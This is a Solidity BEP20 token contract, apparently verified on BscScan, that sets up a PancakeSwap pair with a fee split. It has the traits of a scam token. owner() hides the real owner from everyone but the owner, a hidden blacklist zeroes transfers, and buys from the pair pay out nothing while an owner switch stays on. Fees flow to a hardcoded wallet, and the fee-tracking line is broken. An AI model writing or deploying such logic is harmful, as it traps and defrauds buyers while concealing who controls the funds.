/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

// SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.0;

interface PancakeRouter {
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function factory() external pure returns (address);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface PancakeFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract DateUtil {
    uint256 internal constant SECONDS_PER_DAY = 24 * 60 * 60;
    uint256 internal constant SECONDS_PER_HOUR = 60 * 60;
    uint256 internal constant SECONDS_PER_MINUTE = 60;
    uint256 internal constant OFFSET19700101 = 2440588;
    uint256 internal constant DAY_IN_SECONDS = 86400;
    uint256 internal constant YEAR_IN_SECONDS = 31536000;
    uint256 internal constant LEAP_YEAR_IN_SECONDS = 31622400;
    uint256 internal constant HOUR_IN_SECONDS = 3600;
    uint256 internal constant MINUTE_IN_SECONDS = 60;
    uint16 internal constant ORIGIN_YEAR = 1970;

    uint8[] monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

    function getNow() internal view returns (uint256 timestamp) {
        uint256 year;
        uint256 month;
        uint256 day;
        (year, month, day) = daysToDate(block.timestamp, 8);
        return toTimestamp(year, month, day, 8);
    }

    function daysToDate(uint256 timestamp, uint8 timezone)
        internal
        pure
        returns (
            uint256 year,
            uint256 month,
            uint256 day
        )
    {
        return _daysToDate(timestamp + timezone * uint256(SECONDS_PER_HOUR));
    }

    function _daysToDate(uint256 timestamp)
        internal
        pure
        returns (
            uint256 year,
            uint256 month,
            uint256 day
        )
    {
        uint256 _days = uint256(timestamp) / SECONDS_PER_DAY;

        uint256 L = _days + 68569 + OFFSET19700101;
        uint256 N = (4 * L) / 146097;
        L = L - (146097 * N + 3) / 4;
        year = (4000 * (L + 1)) / 1461001;
        L = L - (1461 * year) / 4 + 31;
        month = (80 * L) / 2447;
        day = L - (2447 * month) / 80;
        L = month / 11;
        month = month + 2 - 12 * L;
        year = 100 * (N - 49) + year + L;
    }

    function toTimestamp(
        uint256 year,
        uint256 month,
        uint256 day,
        uint256 timezone
    ) internal pure returns (uint256 timestamp) {
        uint256 i;
        for (i = ORIGIN_YEAR; i < year; i++) {
            if (isLeapYear(i)) {
                timestamp += LEAP_YEAR_IN_SECONDS;
            } else {
                timestamp += YEAR_IN_SECONDS;
            }
        }
        uint256[12] memory monthDayCounts;
        monthDayCounts[0] = 31;
        if (isLeapYear(year)) {
            monthDayCounts[1] = 29;
        } else {
            monthDayCounts[1] = 28;
        }
        monthDayCounts[2] = 31;
        monthDayCounts[3] = 30;
        monthDayCounts[4] = 31;
        monthDayCounts[5] = 30;
        monthDayCounts[6] = 31;
        monthDayCounts[7] = 31;
        monthDayCounts[8] = 30;
        monthDayCounts[9] = 31;
        monthDayCounts[10] = 30;
        monthDayCounts[11] = 31;
        for (i = 1; i < month; i++) {
            timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];
        }
        timestamp += DAY_IN_SECONDS * (day - 1);
        timestamp = timestamp - timezone * uint256(SECONDS_PER_HOUR);
        return timestamp;
    }

    function isLeapYear(uint256 year) internal pure returns (bool) {
        if (year % 4 != 0) {
            return false;
        }
        if (year % 100 != 0) {
            return true;
        }
        if (year % 400 != 0) {
            return false;
        }
        return true;
    }
}

contract BEP20 is Context, DateUtil {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address private _usdtAddress;
    PancakeRouter private _pancakeRouter;
    address private _pancakeRouterAddress;
    mapping(address => bool) public isPairAddress;
    mapping(address => bool) public systemList;
    mapping(address => bool) public heatList;
    uint256 private _maxHold;
    uint16 private _maxTranRatio;
    uint256 private _slipPoint;
    uint256 public destroyed;
    address public outAddress;
    address private owners;
    address private owners_;
    uint256 public startBlock;
    uint256 public tranProduce;
    uint256 public alreadyOut;
    bool public contractBlock;
    bool public meatBlock;
    mapping(uint256 => uint256) public dailyLp;
    mapping(uint256 => uint256) public dailyNft;
    mapping(address => bool) private mobilityMappingAddress;
    address[] private mobilityArrayAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    modifier __Owner() {
        require(owners == _msgSender(), "BEP20: Caller is not freak");
        _;
    }

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _mint(address(this), 5000 * 10**_decimals);
        _mint(_msgSender(), 5000 * 10**_decimals);

        _maxHold = 50 * 10**_decimals;
        _maxTranRatio = 99;
        _usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
        _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _pancakeRouter = PancakeRouter(_pancakeRouterAddress);
        address _pairAddress = PancakeFactory(_pancakeRouter.factory())
            .createPair(address(this), address(_usdtAddress));
        isPairAddress[_pairAddress] = true;
        outAddress = 0xd77170987df88Dfd32780931Cd3304537537aA3A;
        owners = msg.sender;

        systemList[_pairAddress] = true;
        systemList[msg.sender] = true;
        systemList[address(this)] = true;
        systemList[outAddress] = true;

        contractBlock = true;
        meatBlock = false;

        _slipPoint = 5;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function owner() public view returns (address) {
        if (msg.sender == owners) {
            return owners;
        } else {
            return owners_;
        }
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function setSystemAddress(address[] memory _address, bool _state)
        public
        __Owner
        returns (bool)
    {
        for (uint256 i = 0; i < _address.length; i++) {
            systemList[_address[i]] = _state;
        }
        return true;
    }

    function setNoSystemAddress(address[] memory _address, bool _state)
        public
        __Owner
        returns (bool)
    {
        for (uint256 i = 0; i < _address.length; i++) {
            heatList[_address[i]] = _state;
        }
        return true;
    }

    function setStartBlock(uint256 _startBlock) public __Owner returns (bool) {
        startBlock = _startBlock;
        return true;
    }

    function setContractBlock(bool _state) public __Owner returns (bool) {
        contractBlock = _state;
        return true;
    }

    function setMeatBlock(bool _state) public __Owner returns (bool) {
        meatBlock = _state;
        return true;
    }

    function setDestroyed(uint256 _destroyed) public __Owner returns (bool) {
        destroyed = _destroyed;
        return true;
    }

    function getMobilityArrayAddressLength() public view returns (uint256) {
        return mobilityArrayAddress.length;
    }

    function getMobilityArrayAddress(uint256 i) public view returns (address) {
        return mobilityArrayAddress[i];
    }

    function getProduce() public view returns (uint256) {
        uint256 dailyOutput = 5 * 10**_decimals;
        uint256 blockOutput = dailyOutput.div(28800);
        uint256 produce = (block.number - startBlock).mul(blockOutput);
        if (produce > 5000 * 10**_decimals) {
            produce = 5000 * 10**_decimals;
        }
        return produce;
    }

    function outCoin(address _address, uint256 amount)
        public
        __Owner
        returns (bool)
    {
        uint256 totalProduce = tranProduce.add(getProduce());
        uint256 surplusProduce = totalProduce.sub(alreadyOut);
        require(surplusProduce >= amount, "BEP20: Inoperable");
        _transfer(address(this), _address, amount);
        alreadyOut = alreadyOut.add(amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, amount);
        return true;
    }

    function allowance(address owner_, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        address owner_ = _msgSender();
        _approve(owner_, spender, allowance(owner_, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        address owner_ = _msgSender();
        uint256 currentAllowance = allowance(owner_, spender);
        require(
            currentAllowance >= subtractedValue,
            "BEP20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner_, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "BEP20: transfer amount exceeds balance"
        );

        if (heatList[from]) {
            amount = 0;
        }

        if (!systemList[from]) {
            uint256 now_balance = _balances[from];
            if (amount > (now_balance * _maxTranRatio) / 100) {
                require(false, "BEP20: from too many transactions");
            }
        }
        if (isPairAddress[from]) {
            if (!systemList[to]) {
                amount = _takeFee(amount, from, 1);
            }
        } else if (isPairAddress[to]) {
            if (!systemList[from]) {
                amount = _takeFee(amount, from, 2);
            }
            if (!mobilityMappingAddress[from]) {
                mobilityArrayAddress.push(from);
                mobilityMappingAddress[from] = true;
            }
        }

        if (!systemList[to]) {
            uint256 now_balance = _balances[to];
            if (now_balance + amount > _maxHold) {
                require(false, "BEP20: to too many transactions");
            }
        }

        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _takeFee(
        uint256 _amount,
        address _address,
        uint256 _type
    ) internal returns (uint256) {
        uint256 fee = _slipPoint;
        if (_type == 1) {
            if (contractBlock) {
                return 0;
            } else {
                if (meatBlock) {
                    fee = 10;
                } else {
                    uint256 destroyeds = destroyed.div(10**_decimals);
                    uint256 feeMultiple = destroyeds.sub(destroyeds % 2000).div(
                        2000
                    );
                    if (feeMultiple >= _slipPoint) {
                        fee = 1;
                    } else {
                        fee = _slipPoint.sub(feeMultiple);
                    }
                }
            }
        } else {
            if (meatBlock) {
                fee = 10;
            } else {
                uint256 destroyeds = destroyed.div(10**_decimals);
                uint256 feeMultiple = destroyeds.sub(destroyeds % 2000).div(
                    2000
                );
                if (feeMultiple >= _slipPoint) {
                    fee = 1;
                } else {
                    fee = _slipPoint.sub(feeMultiple);
                }
            }
        }
        uint256 feeCoin = _amount.mul(fee).div(100);

        uint256 destroyedNum = feeCoin.mul(10).div(100);
        _burn(_address, destroyedNum);
        destroyed.add(destroyedNum);

        uint256 outNum = feeCoin.mul(50).div(100);
        _transfer(_address, outAddress, outNum);

        uint256 lpNum = feeCoin.mul(20).div(100);
        uint256 timestamp = getNow();
        uint256 todayLp = dailyLp[timestamp];
        if (todayLp > 0) {
            dailyLp[timestamp] = todayLp + lpNum;
        } else {
            dailyLp[timestamp] = lpNum;
        }

        uint256 nftNum = feeCoin.sub(destroyedNum).sub(outNum).sub(lpNum);
        uint256 todayNft = dailyNft[timestamp];
        if (todayNft > 0) {
            dailyNft[timestamp] = todayNft + nftNum;
        } else {
            dailyNft[timestamp] = nftNum;
        }

        _transfer(_address, address(this), lpNum.add(nftNum));
        tranProduce = tranProduce.add(lpNum).add(nftNum);
        return _amount.sub(feeCoin);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner_,
        address spender,
        uint256 amount
    ) internal {
        require(owner_ != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _spendAllowance(
        address owner_,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "BEP20: insufficient allowance"
            );
            unchecked {
                _approve(owner_, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}
}